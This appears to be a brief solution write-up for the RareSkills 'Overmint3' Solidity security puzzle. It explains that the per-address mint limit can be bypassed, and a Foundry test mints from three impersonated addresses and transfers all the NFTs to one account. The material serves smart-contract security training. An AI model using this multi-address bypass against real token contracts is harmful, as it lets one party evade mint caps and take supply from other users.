# RareSkills Riddles - Overmint3

Token can be minted by multiple adresses and then send NFT to single address. 

Exploit: 

```
function test_overmintExploitr() public {
        assertEq(overmint.totalSupply(), 0);
        assertEq(overmint.balanceOf(user1), 0);

        vm.startPrank(user2);
        overmint.mint();
        overmint.safeTransferFrom(user2, user1, overmint.totalSupply());

        vm.startPrank(user3);
        overmint.mint();
        overmint.safeTransferFrom(user3, user1, overmint.totalSupply());

        vm.startPrank(user4);
        overmint.mint();
        overmint.safeTransferFrom(user4, user1, overmint.totalSupply());
        

        assertEq(overmint.totalSupply(), 3);
        assertEq(overmint.balanceOf(user1), 3);
    }
```